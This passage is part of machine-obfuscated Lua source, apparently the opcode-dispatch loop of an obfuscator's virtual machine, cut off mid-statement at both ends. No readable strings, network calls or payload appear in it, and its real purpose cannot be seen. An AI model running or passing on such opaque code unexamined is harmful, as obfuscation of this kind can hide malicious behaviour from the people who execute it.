y=e[n];else if ba>16 then n=n+1;else w[y[125]]={};end end else if ba<=19 then if ba>18 then w[y[125]][y[392]]=w[y[54]];else y=e[n];end else if 20<ba then y=e[n];else n=n+1;end end end else if ba<=25 then if ba<=23 then if 22==ba then w[y[125]]=o[y[392]];else n=n+1;end else if 24==ba then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if ba<=27 then if 27~=ba then n=n+1;else y=e[n];end else if 28<ba then break else if w[y[125]]then n=n+1;else n=y[392];end;end end end end end ba=ba+1 end elseif z==36 then w={};for ba=0,u,1 do if ba<i then w[ba]=s[ba+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=38 then local ba;w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif 40~=z then local ba;w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end end;elseif 43>=z then if z<=41 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[125]]=h[y[392]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if ba<=7 then n=n+1;else if ba~=9 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=e[n];end else if ba<=12 then w[y[125]]=w[y[392]][y[54]];else if ba~=14 then n=n+1;else y=e[n];end end end else if ba<=16 then if ba~=16 then bd=y[125]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[54]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 42==z then local ba;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else w[y[125]]=w[y[392]]/y[54];end;elseif z<=44 then w[y[125]]=w[y[392]]+y[54];elseif 46>z then local ba;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else local ba;w={};for bb=0,u,1 do if bb<i then w[bb]=s[bb+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](w[ba+1])end;elseif 70>=z then if z<=58 then if z<=52 then if 49>=z then if z<=47 then w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if(w[y[125]]~=w[y[54]])then n=n+1;else n=y[392];end;elseif z<49 then local ba=y[392];local bb=y[54];local ba=k(w,g,ba,bb);w[y[125]]=ba;else local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))end;elseif 50>=z then w[y[125]]=w[y[392]][w[y[54]]];elseif z>51 then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end else w[y[125]]=y[392];end;elseif z<=55 then if z<=53 then local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif z<55 then local ba;w={};for bb=0,u,1 do if bb<i then w[bb]=s[bb+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))end;elseif 56>=z then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end elseif z>57 then w={};for ba=0,u,1 do if ba<i then w[ba]=s[ba+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+y[54];n=n+1;y=e[n];h[y[392]]=w[y[125]];n=n+1;y=e[n];do return end;n=n+1;y=e[n];do return end;else local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))end;elseif 64>=z then if z<=61 then if 59>=z then h[y[392]]=w[y[125]];elseif 60==z then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end else w[y[125]][y[392]]=w[y[54]];end;elseif z<=62 then local ba;w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif z<64 then local ba;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[125];do return w[ba](r(w,ba+1,y[392]))end;n=n+1;y=e[n];ba=y[125];do return r(w,ba,p)end;end;elseif z<=67 then if 65>=z then local ba;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif 67~=z then w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if w[y[125]]then n=n+1;else n=y[392];end;else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];bc=y[392];bb=y[54];ba=k(w,g,bc,bb);w[y[125]]=ba;end;elseif z<=68 then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end elseif z~=70 then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end end;elseif 82>=z then if 76>=z then if z<=73 then if z<=71 then if(w[y[125]]~=w[y[54]])then n=y[392];else n=n+1;end;elseif z>72 then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end else w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];do return w[y[125]]end end;elseif 74>=z then local ba;w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba]()elseif z~=76 then local ba;local bb;local bc;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];bc=y[392];bb=y[54];ba=k(w,g,bc,bb);w[y[125]]=ba;else local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))end;elseif 79>=z then if z<=77 then w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];elseif 78<z then local ba;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](w[ba+1])else w[y[125]]={r({},1,y[392])};end;elseif 80>=z then local ba=y[125]w[ba](r(w,ba+1,y[392]))elseif 82>z then local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end end;elseif 88>=z then if 85>=z then if z<=83 then local ba;w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif 84==z then local ba=y[125]w[ba](w[ba+1])else local ba=y[125];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;end;elseif 86>=z then w[y[125]][w[y[392]]]=w[y[54]];elseif z~=88 then local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=false;n=n+1;y=e[n];q=y[125]w[q](w[q+1])end;elseif z<=91 then if z<=89 then local q=y[125];local x=w[y[392]];w[q+1]=x;w[q]=x[y[54]];elseif z<91 then local q;w={};for x=0,u,1 do if x<i then w[x]=s[x+1];else break;end;end;n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=#w[y[392]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125];w[q]=w[q]-w[q+2];n=y[392];else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])end;elseif 92>=z then w[y[125]]=#w[y[392]];elseif 94>z then w[y[125]]=w[y[392]]+w[y[54]];else local q=y[125];local x=y[54];local ba=q+2;local bb={w[q](w[q+1],w[ba])};for bc=1,x do w[ba+bc]=bb[bc];end local q=w[q+3];if q then w[ba]=q;n=y[392];else n=n+1 end;end;elseif z<=141 then if z<=117 then if 105>=z then if 99>=z then if(96>=z)then if z<96 then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 0<q then w[y[125]]=o[y[392]];else x=nil end else if q==2 then n=n+1;else y=e[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if q<=6 then y=e[n];else if 7<q then n=n+1;else w[y[125]]=y[392];end end end end else if q<=13 then if q<=10 then if q~=10 then y=e[n];else w[y[125]]=y[392];end else if q<=11 then n=n+1;else if q>12 then w[y[125]]=y[392];else y=e[n];end end end else if q<=15 then if q~=15 then n=n+1;else y=e[n];end else if q<=16 then x=y[125]else if 18>q then w[x]=w[x](r(w,x+1,y[392]))else break end end end end end q=q+1 end else local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q>0 then w[y[125]]=w[y[392]][w[y[54]]];else x=nil end else if q~=3 then n=n+1;else y=e[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[125]]=w[y[392]];end else if q<=6 then y=e[n];else if q>7 then n=n+1;else w[y[125]]=y[392];end end end end else if q<=13 then if q<=10 then if 9==q then y=e[n];else w[y[125]]=y[392];end else if q<=11 then n=n+1;else if 12==q then y=e[n];else w[y[125]]=y[392];end end end else if q<=15 then if 14==q then n=n+1;else y=e[n];end else if q<=16 then x=y[125]else if 18~=q then w[x]=w[x](r(w,x+1,y[392]))else break end end end end end q=q+1 end end;elseif(z==97 or z<97)then w[y[125]]=(w[y[392]]/y[54]);elseif z~=99 then local q,x,ba,bb=0 while true do if q<=15 then if q<=7 then if q<=3 then if q<=1 then if q>0 then ba=nil else x=nil end else if q>2 then w[y[125]]=h[y[392]];else bb=nil end end else if q<=5 then if q~=5 then n=n+1;else y=e[n];end else if q==6 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end else if q<=11 then if q<=9 then if 8<q then w[y[125]]=h[y[392]];else y=e[n];end else if q<11 then n=n+1;else y=e[n];end end else if q<=13 then if 12<q then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if q<15 then y=e[n];else w[y[125]]=w[y[392]][w[y[54]]];end end end end else if q<=23 then if q<=19 then if q<=17 then if q==16 then n=n+1;else y=e[n];end else if 19>q then w[y[125]]=h[y[392]];else n=n+1;end end else if q<=21 then if 20==q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if q<23 then n=n+1;else y=e[n];end end end else if q<=27 then if q<=25 then if q~=25 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end else if 27>q then y=e[n];else bb=y[392];end end else if q<=29 then if 28<q then x=k(w,g,bb,ba);else ba=y[54];end else if 30<q then break else w[y[125]]=x;end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if q==3 then w[y[125]]=h[y[392]];else n=n+1;end end end else if q<=6 then if 6~=q then y=e[n];else w[y[125]]=h[y[392]];end else if q<=7 then n=n+1;else if q==8 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if q<=14 then if q<=11 then if q==10 then n=n+1;else y=e[n];end else if q<=12 then w[y[125]]=w[y[392]][w[y[54]]];else if q~=14 then n=n+1;else y=e[n];end end end else if q<=16 then if q>15 then ba={w[bb](w[bb+1])};else bb=y[125]end else if q<=17 then x=0;else if 18<q then break else for bc=bb,y[54]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end end;elseif 102>=z then if 100>=z then local q=y[125]local x,ba=j(w[q](r(w,q+1,y[392])))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;elseif z~=102 then w[y[125]]=w[y[392]][y[54]];else local q=y[125];w[q]=w[q]-w[q+2];n=y[392];end;elseif z<=103 then w[y[125]]=b(d[y[392]],nil,o);elseif z~=105 then if not w[y[125]]then n=n+1;else n=y[392];end;else local q;local x;local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];ba=y[125]x={w[ba](w[ba+1])};q=0;for bb=ba,y[54]do q=q+1;w[bb]=x[q];end end;elseif 111>=z then if z<=108 then if z<=106 then local q;w={};for x=0,u,1 do if x<i then w[x]=s[x+1];else break;end;end;n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125];w[q]=w[q]-w[q+2];n=y[392];elseif 108~=z then w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if(w[y[125]]~=w[y[54]])then n=n+1;else n=y[392];end;else local q;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][w[y[392]]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];q=y[125]w[q]=w[q](w[q+1])end;elseif z<=109 then local q;w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))elseif 110==z then if(w[y[125]]~=y[54])then n=y[392];else n=n+1;end;else local q;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]]*y[54];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];w[y[125]]=o[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]]+w[y[54]];n=n+1;y=e[n];q=y[125]w[q]=w[q](r(w,q+1,y[392]))end;elseif z<=114 then if 112>=z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q<1 then x=nil else ba=nil end else if q<=2 then bb=nil else if q>3 then n=n+1;else w[y[125]]=h[y[392]];end end end else if q<=6 then if q<6 then y=e[n];else w[y[125]]=h[y[392]];end else if q<=7 then n=n+1;else if 9~=q then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=e[n];end else if q<=12 then w[y[125]]=w[y[392]][w[y[54]]];else if 13==q then n=n+1;else y=e[n];end end end else if q<=16 then if q<16 then bb=y[125]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q~=19 then for bc=bb,y[54]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif z>113 then local 